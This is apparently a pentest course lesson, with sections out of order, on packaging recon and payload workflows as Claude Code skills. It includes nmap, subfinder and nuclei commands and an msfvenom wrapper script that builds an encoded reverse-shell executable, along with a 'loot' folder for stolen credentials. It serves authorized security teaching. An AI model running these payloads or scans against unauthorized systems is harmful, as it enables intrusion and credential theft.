   "Run nikto against these hosts sequentially, save each output to
   ./scans/nikto-<host>.txt, and return a one-line summary per host."
4. Wait for all subagents to complete.
5. Collate summaries into a single report grouped by host.

The model reads step 3 and calls the Task tool with the given prompt for each group. Each subagent runs in parallel in its own context — main context stays clean.
12.3 Rules for subagent-invoking skills

    Always tell the subagent what to write and where. Vague "do recon" prompts produce inconsistent outputs.
    Always specify a return-value contract. "Return one line per host: <host> — <status> — <finding count>."
    Never let subagents write to the same file. Give each a unique output path.
    Never spawn more than ten subagents at once from a single skill. Beyond that, throughput drops and errors rise.

13. Skills That Write Persistent Files — Output Conventions

Most pentest skills produce artifacts. Standardize where those artifacts go so the whole engagement stays organized.
13.1 Recommended output tree
./engagement-root/
├── scope.md
├── recon/
│   └── <target>/
│       ├── subs.txt
│       ├── live.txt
│       └── findings.txt
├── scans/
│   └── <target>/
│       ├── scan.nmap
│       ├── scan.xml
│       └── scan.gnmap
├── payloads/
│   └── <date>/
│       ├── shell.exe
│       └── shell.exe.sha256
├── loot/
│   └── <host>/
│       ├── creds.txt
│       └── hashes.txt
└── report/
    ├── findings/
    └── screenshots/
13.2 Enforce the convention in the skill

Every skill that writes should hard-code its output location in the body:
## Steps
1. Create output directory: `mkdir -p ./recon/<root>/`
2. Write all files under `./recon/<root>/`.
3. Never write outside `./recon/`, `./scans/`, `./payloads/`, `./loot/`, or `./report/`.

That guardrail prevents Claude from scattering files across the working directory when a skill is invoked from an unfamiliar location.
13.3 Filename conventions

    Timestamps in filenames use ISO-8601: 2026-09-05T12-30-scan.xml.
    Never overwrite existing outputs — append a numeric suffix.
    Always write a companion .sha256 for binary payloads.

14. Version Control for Skills — One Skill per Branch

Skills are code. Treat them like code.
14.1 Repo layout

Store your skills in one git repo:
~/skills-repo/
├── subdomain-enum/
│   └── SKILL.md
├── port-scan/
│   ├── SKILL.md
│   └── references/
├── payload-generate/
│   ├── SKILL.md
│   └── scripts/
└── README.md

Symlink each into ~/.claude/skills/:
ln -s ~/skills-repo/subdomain-enum ~/.claude/skills/subdomain-enum
ln -s ~/skills-repo/port-scan ~/.claude/skills/port-scan

Now git status in ~/skills-repo/ tells you what has changed and every edit is versioned.
14.2 Branch per change

One skill change per feature branch:
git checkout -b subdomain-enum/add-assetfinder-fallback
# edit subdomain-enum/SKILL.md
git commit -am "subdomain-enum: fall back to assetfinder when subfinder returns 0 hits"
14.3 Testing before merge

Before merging a skill change to main, run the three tests from section 7 against the branch:

    Direct invocation: does /subdomain-enum still work?
    Trigger-phrase invocation: do all three paraphrases still fire it?
    Passive load: does it still surface in the broader planning conversation?

If yes on all three, merge. If no, refine the description or step wording.
14.4 PR review checklist

    SKILL.md frontmatter parses as YAML.
    description follows the three-part pattern (what/when/keywords).
    Steps are imperative and numbered.
    Every referenced resource file exists.
    No hard-coded absolute paths.
    No credentials, keys, or IPs from a real engagement.

15. Distributing Skills — Plugin, Repo, Marketplace

Once a skill or a set of skills is stable, share it.
15.1 As a plugin

A Claude Code plugin is a directory with a plugin.json and a skills/ subdirectory:
red-team-kit/
├── plugin.json
└── skills/
    ├── subdomain-enum/
    ├── port-scan/
    └── payload-generate/

plugin.json:
{
  "name": "red-team-kit",
  "version": "1.0.0",
  "description": "Recon and payload skills for external pentests.",
  "author": "Red Team Leaders"
}

Install locally with claude plugin install ./red-team-kit. Anyone who installs the plugin gets all three skills at once.
15.2 As a shared git repo

Publish the skills repo on GitHub with instructions:
## Install
git clone https://github.com/<org>/pentest-skills ~/skills-repo
ln -s ~/skills-repo/* ~/.claude/skills/

Team members run those two commands and every skill drops into their global scope.
15.3 As a marketplace entry

Some Claude Code deployments include a plugin marketplace. Package the skill set as a plugin (section 15.1), tag a release, and submit the release archive to the marketplace listing per the marketplace's submission rules.
15.4 What to check before publishing

    No API keys in any file (git-secrets --scan catches most).
    No client names or IPs.
    README with an example invocation per skill.
    License file — MIT is standard for internal tooling.
    Version in plugin.json matches the git tag.

16. Best Practices — Small Skills, Clear Preconditions, Explicit Outputs

Five rules that separate skills that work from skills that sit unused.
16.1 Small skills over monoliths

Do not build recon that does subdomains + ports + directories + vulns. Build four skills: subdomain-enum, port-scan, dir-fuzz, nuclei-scan. The model picks the right one for the situation; a monolithic skill misfires whenever the situation is not "do everything."
16.2 Clear preconditions

Every skill's Preconditions section lists exactly what must be true before the skill runs. Missing tools, missing scope confirmation, missing input files — call them out at the top so the model checks them at step 0.
16.3 Explicit outputs

Every skill states, in the body, what files it produces and where. That lets a downstream skill say "read ./recon/<root>/live.txt" without having to guess the format.
16.4 Named decisions

Every branching point uses a named decision tree with explicit if guards. The model executes trees deterministically; it improvises on freeform descriptions.
16.5 Version resource files with the skill

Never reference a resource file that lives outside the skill directory. When you distribute the skill, the resource file goes with it.
16.6 Anti-patterns to avoid
Anti-pattern	Why it fails
Skill that requires editing SKILL.md per run	Not reusable
Skill body with paragraphs of exposition	Model ignores steps buried in prose
Skill that shells out to interactive tools	Session hangs waiting for input
Skill that hardcodes engagement-specific paths	Breaks on the next engagement
Skill that mixes global and project scope in the same directory	Unpredictable which one loads
17. Full End-to-End — Building nuclei-scan

We finish by walking through the full authoring cycle for one more skill, nuclei-scan, including test-and-refine passes.
17.1 Requirements

    Input: a list of live URLs (from httpx or elsewhere).
    Output: a Markdown finding table by severity and host.
    Behavior: pick template set from operator hint (web-app, cloud, network).
    Constraint: never scan info severity on first pass.

17.2 First-draft SKILL.md
---
name: nuclei-scan
description: Scan a URL list with nuclei and produce a findings report.
---

# nuclei-scan

## Steps
1. Run nuclei on the URL list.
2. Save output.
3. Report findings.

That is not a skill. The frontmatter has no trigger keywords, the steps have no flags, and there is no decision-making. Test it: type "vuln-scan this list of URLs" and Claude will not fire the skill because "nuclei" is not in the request and the description does not link to "vuln-scan."
17.3 Second draft — description expanded
---
name: nuclei-scan
description: Scan a list of live URLs with nuclei to find CVEs and misconfigurations, choosing template categories based on target type (web-app, cloud, network). Use when the operator has a URL list and asks for a vuln scan, cve check, template scan, or first-pass vulnerability sweep. Handles nuclei, template scan, vuln scan, cve, misconfiguration, exposure check.
---

Now the three phrasings fire it:

    "Vuln-scan this list" — matches "vuln scan."
    "Check these URLs for CVEs" — matches "cve check."
    "Run nuclei against live.txt" — matches "nuclei."

17.4 Third draft — body with a decision tree
# nuclei-scan

## When to use
The operator has a URL list (usually from httpx) and wants a first-pass
vulnerability sweep. Picks template categories from operator hint.

## Preconditions
- `nuclei` installed and templates updated (`nuclei -update-templates`).
- URL list exists and contains live URLs, not raw hostnames.
- Operator has confirmed rate-limit expectations.

## Decision tree — template selection

If the operator says "web-app" or "web application":
  `-t http/ -t exposures/ -t misconfiguration/`

If the operator says "cloud" or names a cloud provider:
  `-t cloud/ -t exposures/tokens/ -t misconfiguration/`

If the operator says "network" or "infra":
  `-t network/ -t default-logins/`

If the operator says "everything" or is unsure:
  omit `-t` (use all templates). Warn about scan duration.

Default when unsure: `-t http/ -t exposures/ -t misconfiguration/`.

## Decision tree — severity

Never scan `info,low` on a first pass. Start with `medium,high,critical`.

If a specific `high` or `critical` finding needs corroboration, rerun with
`-severity low` scoped to the affected host only.

## Steps

1. Confirm URL list path and target category with the operator.
2. Update templates if last update was more than 7 days ago:
   `nuclei -update-templates`
3. Build the command using the decision trees.
4. Run:
   `nuclei -l <urls> -severity medium,high,critical <template-flags> -rate-limit 150 -c 25 -o ./scans/nuclei-<date>.txt -jsonl -json-export ./scans/nuclei-<date>.jsonl`
5. Parse the JSONL output and build a Markdown table:
   `| Severity | Template | Host | Matched-at |`
6. Group by severity, then by host. Present to operator.
7. Suggest next steps per top finding.

## Common pitfalls
- Running `-severity info` on first pass — thousands of noise findings.
- Running against staging templates on prod — check `-t` paths carefully.
- Not updating templates — missing recent CVEs. Update weekly at minimum.
17.5 Lab test

Set up a lab:
mkdir -p ~/lab/nuclei-test
cd ~/lab/nuclei-test
echo "http://scanme.nmap.org" > urls.txt
echo "https://scanme.nmap.org" >> urls.txt

Launch Claude Code in that directory:
> vuln-scan urls.txt as a web-app target

Verify:

    nuclei-scan skill auto-fires (check verbose logs).
    The decision tree picks the web-app template branch.
    The final command written is what the skill body describes.
    The Markdown finding table is generated and grouped correctly.

17.6 Refine trigger phrasing

Try three more phrasings and note which fire the skill:

    "Look for CVEs in urls.txt" — fires (matches "cve check").
    "Do a template scan of these URLs" — fires (matches "template scan").
    "Sweep urls.txt for exposures" — does not fire — "sweep" and "exposures" not in the description.

Add the missing vocabulary:
description: ... Handles nuclei, template scan, vuln scan, cve, misconfiguration, exposure check, exposure sweep, first-pass vulnerability sweep.

Retest — now the third phrasing fires. Commit the refinement.
17.7 Version and ship
cd ~/skills-repo
git checkout -b nuclei-scan/initial
git add nuclei-scan/
git commit -m "nuclei-scan: initial skill with template category decision tree"
git push origin nuclei-scan/initial

Open a PR against main, review it against the checklist in section 14.4, merge.
18. Exercises
18.1 Guided

Exercise G1 — Add an ALB-check step to subdomain-enum

Extend subdomain-enum/SKILL.md so that after httpx, it also runs a check for AWS ALB-owned hostnames (a dig +short CNAME for each live host, filtering for elb.amazonaws.com). Save results to ./recon/<root>/alb.txt. Test that the change does not break the existing three-stage flow.

Exercise G2 — Add a -p- guard to port-scan

Modify the port-range decision tree so that when the operator says "full scan" or -p-, the skill first checks target size. If the target is a CIDR wider than /28, warn the operator that full-port scan across that many hosts will take hours and offer --top-ports 1000 as an alternative. Verify the guard fires by asking Claude to run a full scan against 10.0.0.0/24.

Exercise G3 — Add an EDR-warning branch to payload-generate

Add a new decision-tree branch: if the operator says "EDR", "AV bypass", or "evasion," the skill must refuse to generate a stock msfvenom payload and instead explain that shikata_ga_nai does not evade modern EDR. It should suggest a custom loader path. Test that asking for an "EDR-bypass payload" triggers the refusal.
18.2 Independent

Exercise I1 — Author a smb-enum skill

Build a full SKILL.md that enumerates SMB hosts using smbclient, enum4linux-ng, and rpcclient. Include a decision tree for null-session vs authenticated vs Kerberos. Version-control the skill in a branch and open a self-review PR.

Exercise I2 — Author a jwt-triage skill

Build a SKILL.md that decodes a JWT (base64url decode of the three segments), extracts algorithm and claims, checks for alg=none, weak signing keys via jwt_tool, and produces a finding when any check fires. Include one script resource that wraps jwt_tool and one reference file with the CVE list for known JWT library flaws.

Exercise I3 — Package the four skills as a plugin

Take subdomain-enum, port-scan, payload-generate, and nuclei-scan, wrap them as a plugin (plugin.json + skills/), install locally with claude plugin install, and verify that all four fire correctly on their trigger phrases from a fresh project directory that does not have them at global scope.
19. Summary and Next-Lesson Pointer

A skill in Claude Code is a Markdown playbook — a SKILL.md with YAML frontmatter and imperative steps — plus optional resource files in the same directory. The frontmatter's description field is the trigger pattern; write it as what/when/keywords and Claude will auto-invoke the skill when the situation matches. The body is imperative, numbered, and uses named decision trees for branching. Resource files load on demand so the top-level SKILL.md stays short and readable.

Skills live at three scopes — project, user-global, plugin — with project winning ties. Test every skill three ways: direct invocation, trigger-phrase invocation, and passive load. Version-control skills the same way you version tools: one repo, one branch per change, PR review against a checklist. Distribute as a plugin, a shared repo, or a marketplace entry.

For pentest work, the highest-value skills wrap the workflows you run every engagement: subdomain-enum, port-scan, payload-generate, nuclei-scan, smb-enum, jwt-triage. Keep each one small, single-purpose, and honest about its preconditions and outputs. Do not build monoliths.

In the next lesson — Lesson 03: Creating Custom Pentest Prompts for Codex — we shift from Claude Code skills to Codex prompt engineering. Codex has a different invocation model and a different prompt structure, but the same underlying principle: encode the workflow so the model executes it consistently. We will build a matched set of Codex prompts for the same recon, exploitation, and payload tasks we just covered, and compare when to reach for Codex versus Claude Code on a live engagement.





































Lesson 02 — Creating Custom Pentest Skills for Claude Code

    Module 06: Building Pentest Skills with Claude and Codex · Penetration Testing with Kali Linux 1.0 · Red Team Leaders

Introduction

A skill in Claude Code is a Markdown playbook — plus an optional folder of resource files — that Claude auto-loads into the conversation when the situation matches its description. Skills are how a red team encodes tradecraft into a form the agent can actually use during an engagement: a subdomain-enumeration routine, a port-scan decision tree, a msfvenom payload wrapper, a Nuclei-tuning workflow. When the trigger phrase or the surrounding context matches, the skill is pulled in without the operator typing anything special, and the steps it contains become part of the current plan.

This lesson walks through the anatomy of a skill from the outside in. First the directory layout, then the YAML frontmatter, then the body of the Markdown, then the resource files it can reference. After the mechanical parts are clear, we build three complete pentest skills from scratch — subdomain-enum, port-scan, and payload-generate — and finish with a full end-to-end nuclei-scan skill that we test in a lab, refine trigger phrasing on, and version-control.

By the end you will be able to sit down with any workflow you run by hand today, package it as a skill in under an hour, and have Claude Code invoke it correctly the next time the context calls for it. Skills are the reusable unit of red-team automation in Claude Code — treat them the same way a mature team treats internal tools: small, single-purpose, tested, and version-controlled.
1. What a Skill Is — A Markdown Playbook Claude Auto-Loads

A skill is one Markdown file called SKILL.md, optionally accompanied by supporting files in the same directory. That is the whole shape of it. The Markdown file describes what the skill does, when Claude should reach for it, and what steps to run. The supporting files — reference scripts, checklists, config templates, wordlists — are pulled in on demand from within the body.

Three things make skills different from a plain-text prompt sitting in a note file:

    Auto-invocation — Claude Code reads every available skill's description field at the start of a session. When a later user message or an intermediate reasoning step matches that description, the skill's body is loaded into the conversation without the user typing the skill name.
    Explicit invocation — the user can also call a skill directly by typing /<skill-name> in the terminal (or by asking Claude to "use the <name> skill"). This is the deterministic path — the skill is loaded whether or not the description matched.
    Scoping — skills live in three places: a user-global directory that applies to every project, a project-local directory that applies only in that repo, and plugin directories that ship a bundle of skills at once. Precedence runs project → user → plugin so a repo can override a global routine when it needs to.

A skill is not a tool in the MCP sense — it does not add a new function to Claude's tool list. It is a snippet of instructions that becomes part of the model's context when relevant. The tools it uses (Bash, Read, Write, WebFetch, the Task subagent tool, MCP tools) are the same ones already available to the session. What the skill contributes is the recipe, the flag choices, the decision points, and the "call this reference file at step 3" plumbing.

The mental model to hold: a skill is to Claude Code what a playbook is to a runbook operator. It is not a program. It is an authoritative document that says "when the situation looks like X, here is the procedure I want you to follow."
2. Skill Anatomy — Directory Layout and SKILL.md

Every skill is a directory whose name is the skill name and whose entry point is SKILL.md. The minimum viable skill is a single-file skill:
~/.claude/skills/
└── subdomain-enum/
    └── SKILL.md

A skill with resource files adds more entries to the same directory:
~/.claude/skills/
└── subdomain-enum/
    ├── SKILL.md
    ├── resolvers.txt
    ├── wordlists/
    │   ├── common.txt
    │   └── deep.txt
    ├── scripts/
    │   ├── merge.sh
    │   └── dedupe.py
    └── references/
        ├── flags.md
        └── troubleshooting.md

The rules that govern the directory:

    The directory name is the skill's public name. subdomain-enum becomes /subdomain-enum.
    SKILL.md must exist at the top of the directory. That is the file Claude reads.
    Every other file in the directory is a resource. Claude does not read them at load time — the body of SKILL.md decides when to read them.
    Subdirectories are allowed and encouraged for organization (scripts/, wordlists/, references/).
    Paths inside SKILL.md are relative to the skill's own directory. When you write Read scripts/merge.sh in the body, the agent resolves that against the skill's directory, not the project's working directory.

The SKILL.md file itself has two parts: a YAML frontmatter block at the very top, and a Markdown body below it. The frontmatter is delimited by --- fences and must be the first thing in the file. The body is regular Markdown and can contain headings, lists, fenced code, tables, and links — whatever Claude will read best.

Bare-minimum SKILL.md:
---
name: subdomain-enum
description: Enumerate subdomains for a given root domain using subfinder, resolve them with httpx, and hand off to nuclei for a quick vuln sweep. Use when the user names a scope like "*.example.com", asks to map a target's attack surface, or requests a subdomain list.
---

# subdomain-enum

## When to use
Any time the operator has a root domain and wants a live subdomain list plus
a first-pass vulnerability sweep. Do not run this against a domain that is
not in scope.

## Steps
1. Confirm the root domain with the operator. If it looks like a paid provider
   (e.g. `*.blob.core.windows.net`, `*.appspot.com`), warn and stop.
2. Run: `subfinder -d <root> -all -silent -o subs.txt`
3. Run: `httpx -l subs.txt -silent -title -status-code -tech-detect -o live.txt`
4. Run: `nuclei -l live.txt -severity medium,high,critical -o findings.txt`
5. Summarize findings by severity, group by host, and present to the operator.

That file, dropped into ~/.claude/skills/subdomain-enum/SKILL.md, is a complete, auto-invocable skill. The next sections unpack each part.
3. The Frontmatter Fields — What Each Does, When to Omit

The frontmatter is where Claude Code decides whether to surface your skill at all. Get this right and the rest is easy; get it wrong and the skill sits on disk unused.
3.1 name (required)

The skill's public identifier. Rules:

    Lowercase letters, digits, and hyphens only.
    Should match the directory name exactly.
    Should be short and memorable — you will type it as /name at the prompt.
    Should describe the action, not the tool: subdomain-enum beats subfinder-wrapper.

If name does not match the directory name, Claude Code prefers the directory name for invocation but may still surface the skill under the frontmatter's name. Keep them in sync to avoid confusion.
3.2 description (required)

The single most important field. This is the text Claude scans to decide whether to auto-invoke the skill. It is not documentation for humans — it is a trigger pattern for the model.

Write it as: what the skill does + when it should fire + a few keywords the user might say. See section 4 for the pattern.
3.3 tools (optional)

A list of tool names the skill is restricted to. If present, only these tools will be available to the model during that skill's execution.
tools:
  - Bash
  - Read
  - Write

Omit when the skill can use any tool the session has available. Include when the skill should be locked down — for example, a "recon-only" skill that must never call Write. In practice, most red-team skills omit tools because pentesters need everything at hand.
3.4 model (optional)

Pins the skill to a specific Claude model.
model: claude-opus-4-7

Use sparingly. A skill that pins a model breaks if that model is retired. Pin only when the skill does something (say, deep multi-step exploit reasoning) that a smaller model measurably fails at. For 90% of pentest skills, leave this unset.
3.5 allowed-tools and other newer fields

Some Claude Code versions add extra frontmatter keys (allowed-tools, dangerously-skip-permissions — this last one only ever inside plugin skills the user has vetted). These are version-specific. If you are writing skills for a team, stick to name, description, and optionally tools. Anything else risks portability.
3.6 A complete frontmatter
---
name: subdomain-enum
description: Enumerate subdomains for a root domain using subfinder, then probe live hosts with httpx and sweep for vulnerabilities with nuclei. Use when the operator names a wildcard scope like *.example.com, asks to map external attack surface, or requests a subdomain list.
tools:
  - Bash
  - Read
  - Write
---

That block is what every skill in this lesson starts with. Sections 9 through 12 build on it.
4. Writing an Effective Description — Trigger Phrasing

A skill fires when its description semantically matches the current situation. That means the description has to read like a lure the model recognizes when the user's language matches.
4.1 The three-part pattern

Every good pentest skill description contains three parts, in this order:

    What the skill does — one clause naming the action and the tools involved.
    When to use it — the trigger scenarios, phrased in the operator's own vocabulary.
    Keywords — extra nouns and verbs the operator might say that map to this skill.

Example, annotated:
Enumerate subdomains for a root domain using subfinder, then probe live
hosts with httpx and sweep for vulnerabilities with nuclei.
[what it does]

Use when the operator names a wildcard scope like *.example.com, asks to
map external attack surface, or requests a subdomain list.
[when to use it]

Handles: subdomain discovery, subfinder, httpx, nuclei, attack surface
management, external asset inventory, ASM.
[keywords]

That last "Handles:" line is optional but very effective — it gives the model direct term-to-skill mappings that improve auto-invocation on paraphrased requests.
4.2 Common description mistakes
Mistake	Bad Example	Better
Describes tool, not action	"Wraps subfinder"	"Enumerates subdomains using subfinder"
Missing trigger	"Runs a Nuclei scan"	"Runs a Nuclei scan when the operator asks to scan a URL list for CVEs"
Too narrow keywords	"For nuclei-scanning"	"vuln scan, cve check, template scan, nuclei"
Description longer than 500 chars	rambling paragraph	tight three-part block
4.3 Testing trigger phrasing

Write the description, then imagine three different ways the operator might phrase the request:

    Direct: "Enumerate subdomains for example.com"
    Paraphrase: "Map the external attack surface of example.com"
    Oblique: "What subs does example.com have?"

If the description contains vocabulary from all three, auto-invocation will work. If it only contains vocabulary from the direct phrasing, only that phrasing will fire it.
5. Writing an Effective Skill Body — Imperative Steps, Decision Trees

The frontmatter gets Claude to open the skill. The body is what happens next.
5.1 Structure the body with headings the model reads

Claude reads Markdown structurally. Use these standard sections and it will follow them:
## When to use
## Preconditions
## Steps
## Reference files
## Common pitfalls

    When to use — restatement of the trigger, in prose. Backs up the frontmatter.
    Preconditions — tools that must be installed, scope that must be confirmed.
    Steps — the actual procedure. Numbered. Imperative.
    Reference files — pointer to the resource files in the same directory.
    Common pitfalls — one-line notes about what breaks.

5.2 Imperative steps beat descriptive prose

Compare:

Bad — descriptive:

    The skill will call subfinder to gather subdomains. Then it should probably feed those into httpx to check which ones are live. After that, the operator might want to run nuclei.

Good — imperative:
## Steps
1. Ask the operator to confirm the root domain is in scope.
2. Run `subfinder -d <root> -all -silent -o subs.txt`.
3. Run `httpx -l subs.txt -silent -title -status-code -tech-detect -o live.txt`.
4. Run `nuclei -l live.txt -severity medium,high,critical -o findings.txt`.
5. Summarize findings grouped by severity and host.

The model executes imperative steps step-by-step. It negotiates descriptive prose.
5.3 Decision trees for branching logic

When the skill needs to branch, use an explicit decision tree the model can follow:
## Decision tree — TCP vs UDP vs SYN

If the operator asks for a "quiet" or "stealth" scan:
  Use `-sS` (SYN scan). Requires root.

If the operator names UDP services (DNS, SNMP, NTP):
  Use `-sU` on the top 100 UDP ports first.

If root is unavailable or the operator does not care about stealth:
  Use `-sT` (full connect scan).

If unsure: default to `-sS` on the top 1000 TCP ports.

The model treats each if line as a guard and picks the first branch that matches.
5.4 Linking to resource files

The body pulls in resource files by name, relative to the skill's directory:
## Reference files
- `flags.md` — full Nmap flag reference. Read this before writing any Nmap command.
- `scripts/parse.py` — parser for Nmap XML into a Markdown table. Use this to build the final report.
- `nse-safe.txt` — safe-category NSE scripts. Never load scripts outside this list without asking.

When Claude reaches step 3 of a procedure that says "consult flags.md before picking flags," it will Read flags.md from the skill directory. That is how you keep the top-level SKILL.md short while making thousands of lines of reference material available on demand.
6. Resource Files — Reference Scripts, Checklists, Config Templates

Resource files are the "load on demand" storage the skill body pulls from. They keep SKILL.md short (which is what the model always reads) while making detailed material available (which the model reads only when the skill needs it).
6.1 Typical resource file types
Kind	Filename convention	Purpose
Reference doc	references/*.md	Flag tables, protocol notes, cheat sheets
Executable script	scripts/*.sh or scripts/*.py	Shell/Python the skill invokes verbatim
Wordlist	wordlists/*.txt	Passed to fuzzers/enumerators as -w
Config template	templates/*.yaml or templates/*.conf	Rendered with values before use
Checklist	checklists/*.md	Pre/post-flight items the model should tick through
6.2 Reference doc — Nmap flag table

references/nmap-flags.md:
# Nmap flag reference

## Scan types
- `-sS` — SYN scan. Half-open. Requires root. Default for most cases.
- `-sT` — TCP connect scan. Completes the handshake. Works without root.
- `-sU` — UDP scan. Slow. Combine with `--top-ports 100`.
- `-sN`, `-sF`, `-sX` — Null, FIN, Xmas. Firewall evasion. Rarely needed.

## Timing
- `-T0` — paranoid. 5 min between probes. Only for extreme stealth.
- `-T3` — normal. Default.
- `-T4` — aggressive. Safe on LAN targets.

## Version and script scans
- `-sV` — service version detection.
- `-sC` — run default (safe) NSE scripts.
- `-A` — aggressive. Combines `-sV -sC -O --traceroute`.

When SKILL.md says "Consult references/nmap-flags.md before choosing timing," the model will read that file and pick flags accurately.
6.3 Script resource — msfvenom wrapper

scripts/gen-reverse.sh:
#!/usr/bin/env bash
set -euo pipefail

LHOST="${1:?Usage: gen-reverse.sh <LHOST> <LPORT> <PAYLOAD> <OUTFILE>}"
LPORT="${2:?}"
PAYLOAD="${3:?}"
OUTFILE="${4:?}"

msfvenom \
  -p "${PAYLOAD}" \
  LHOST="${LHOST}" \
  LPORT="${LPORT}" \
  -f exe \
  -e x86/shikata_ga_nai -i 6 \
  -o "${OUTFILE}"

The skill body says "Run scripts/gen-reverse.sh <lhost> <lport> <payload> <outfile>," and the model runs it. Keeping the msfvenom command inside a script means the flag choices are versioned with the skill.
6.4 Checklist resource — pre-flight

checklists/preflight.md:
# Pre-flight — external recon

Before running any active tool, tick each item:

- [ ] Scope document read and root domain confirmed
- [ ] Wildcard scope not a paid provider (blob.core, s3, appspot)
- [ ] Rate-limit expectation confirmed with operator
- [ ] Output directory created under `./recon/<target>/`
- [ ] Kill switch: operator has your Ctrl+C plan

The skill body says "Load checklists/preflight.md and confirm each item before step 1." The model will read the file, present it to the operator, and wait for confirmation.
7. Testing a Skill — Three Invocation Paths

Once the skill is written, test it three ways before considering it shipped.
7.1 Invoke by name — the deterministic path

Type the skill name at the prompt:
> /subdomain-enum

Or ask directly:
> Use the subdomain-enum skill on example.com.

Claude Code should load SKILL.md and execute step 1 immediately. If the skill does not fire on this direct invocation, the file is not being discovered. Check:

    Is SKILL.md capitalized exactly? (Case matters on Linux.)
    Is the file inside a directory whose name matches the skill name?
    Is the directory under ~/.claude/skills/ or the project's .claude/skills/?
    Does the frontmatter parse as valid YAML? A missing --- closer breaks the file.

7.2 Invoke by trigger phrase — the description test

Rephrase the request in three ways and watch for auto-invocation:
> Enumerate subs for example.com                       (direct)
> Map external attack surface for example.com          (paraphrase)
> What subdomains does example.com expose?             (oblique)

For each, Claude Code should recognize the situation and open SKILL.md automatically. If only the direct phrasing fires it, your description is too narrow — add keywords.
7.3 Observe passive loading — the context test

Start a session about a broader task and see if the skill loads on its own:
> I've been given example.com as an external target with wildcard scope.
> Help me plan the first day of the engagement.

If the skill is well-scoped, it should load partway through the planning conversation, when the model reaches "external enumeration." If it does not load, the description is not linking to the surrounding vocabulary of the pentest workflow.
7.4 Debugging with --verbose

Run Claude Code with verbose logging to see which skills the model considered:
claude --verbose

Verbose mode logs "considered skill X — description matched Y." That output shows exactly which trigger keywords fired and which did not, which is the fastest way to tune the description.
8. Skill Scoping — Global, Project, Plugin

Three directories house skills, and their precedence matters.
8.1 Global — ~/.claude/skills/

Applies to every project on your machine. Best for skills that are truly universal to your work: recon routines, payload wrappers, PoC templates.
~/.claude/skills/
├── subdomain-enum/
├── port-scan/
├── payload-generate/
└── nuclei-scan/

Any Claude Code session on the machine, in any repo, sees these skills.
8.2 Project — .claude/skills/ inside a repo

Applies only to sessions running in that repo. Best for engagement-specific skills:
~/engagements/acme-2026-q1/
├── .claude/
│   └── skills/
│       ├── acme-login-flow/
│       ├── acme-jwt-decoder/
│       └── acme-cve-triage/
├── scope.md
└── notes/

Project skills override global skills of the same name. That is deliberate — a per-engagement nuclei-scan skill can pin a specific template set for that client while your global nuclei-scan stays broad.
8.3 Plugin — distributed as part of a Claude Code plugin

Plugins can ship skill directories. When installed, those skills become available at global scope but never overwrite user-authored global skills of the same name.
~/.claude/plugins/red-team-kit/
└── skills/
    ├── recon-web/
    ├── recon-api/
    └── recon-cloud/

Precedence, top wins:

    Project .claude/skills/<name>/
    User global ~/.claude/skills/<name>/
    Plugin ~/.claude/plugins/<pkg>/skills/<name>/

When a name collides across scopes, the higher scope's skill loads and the lower ones are ignored.
8.4 Which scope for which skill
Skill type	Scope	Why
subdomain-enum (generic recon)	Global	You use it on every engagement
acme-login-flow (client-specific)	Project	Only useful for that repo
web-recon-bundle (team's shared kit)	Plugin	Distributed to the whole team
9. Building Your First Pentest Skill — subdomain-enum

Now we build the first real skill end to end.
9.1 The problem

Every external engagement starts with subdomain enumeration. The workflow is stable — subfinder for discovery, httpx for liveness and metadata, nuclei for a first vuln sweep — but the flags, output paths, and severity filters vary. This is the perfect skill candidate: repeated, mechanical, and worth encoding.
9.2 Directory layout
~/.claude/skills/subdomain-enum/
├── SKILL.md
├── references/
│   └── flags.md
└── scripts/
    └── merge-sources.sh
9.3 Complete SKILL.md
---
name: subdomain-enum
description: Enumerate subdomains for a root domain using subfinder, probe live hosts with httpx, and sweep for medium+ vulnerabilities with nuclei. Use when the operator names a wildcard scope like *.example.com, asks to map external attack surface, requests a subdomain list, or asks about ASM/EASM. Handles subdomain discovery, subfinder, httpx, nuclei, attack surface, asset inventory.
tools:
  - Bash
  - Read
  - Write
---

# subdomain-enum

## When to use
The operator has a root domain in scope and wants a live subdomain list plus a
first-pass vulnerability sweep. Runs three stages: discovery, liveness+meta,
vuln sweep.

## Preconditions
- `subfinder`, `httpx`, and `nuclei` installed and on PATH.
- Operator has confirmed the root domain is in scope. Wildcard scope only
  covers what the scope document says it covers.
- Output directory `./recon/<root>/` will be created if missing.

## Steps

1. Ask the operator: "Confirm root domain and that `*.<root>` is in scope."
   Wait for confirmation. If the operator names a paid-provider wildcard
   (`*.blob.core.windows.net`, `*.appspot.com`, `*.s3.amazonaws.com`), refuse
   and explain the scope issue.

2. Create the output directory:
   `mkdir -p ./recon/<root>/`

3. Run passive discovery:
   `subfinder -d <root> -all -silent -o ./recon/<root>/subs.txt`

   `-all` enables every configured source. `-silent` suppresses banner
   output so the file contains only hostnames.

4. Optional: augment with `assetfinder` if installed:
   `assetfinder --subs-only <root> >> ./recon/<root>/subs.txt`
   Then dedupe with `scripts/merge-sources.sh`.

5. Probe liveness and gather metadata:
   `httpx -l ./recon/<root>/subs.txt -silent -title -status-code -tech-detect -o ./recon/<root>/live.txt`

   Flags mean: silent output, page title, HTTP status, tech stack fingerprint.

6. First-pass vuln sweep:
   `nuclei -l ./recon/<root>/live.txt -severity medium,high,critical -o ./recon/<root>/findings.txt`

   Never run `-severity info,low` on a first pass — the noise-to-signal ratio
   is unacceptable. Escalate to lower severity only after triage.

7. Present findings grouped by severity, then by host. For each host list
   status, tech stack, and any nuclei hits. Ask the operator which host to
   deep-dive next.

## Reference files
- `references/flags.md` — flag reference for subfinder, httpx, nuclei.
- `scripts/merge-sources.sh` — merges and dedupes multiple discovery sources.

## Common pitfalls
- Running `nuclei` before `httpx` — you will scan dead hosts and waste time.
- Forgetting `-severity` — full-severity scans generate thousands of info-level
  hits that drown real findings.
- Scope creep — subfinder returns third-party CNAMEs (CDN, mail hosts) that
  are not in scope. Filter before scanning.
9.4 The referenced flags file

references/flags.md:
# subfinder / httpx / nuclei flag reference

## subfinder
- `-d <domain>` — target root.
- `-dL <file>` — list of roots.
- `-all` — every configured source (needs API keys for full coverage).
- `-silent` — no banner. Output is hostnames only.
- `-o <file>` — output file.
- `-recursive` — recurse discovered subs. Expensive.

## httpx
- `-l <file>` — input list.
- `-silent` — no banner.
- `-title` — page title.
- `-status-code` — HTTP status.
- `-tech-detect` — tech stack via Wappalyzer signatures.
- `-follow-redirects` — follow 3xx.
- `-threads 50` — concurrency. Default 50 is safe.

## nuclei
- `-l <file>` — input list.
- `-severity medium,high,critical` — filter by severity.
- `-t <template-dir>` — restrict template set.
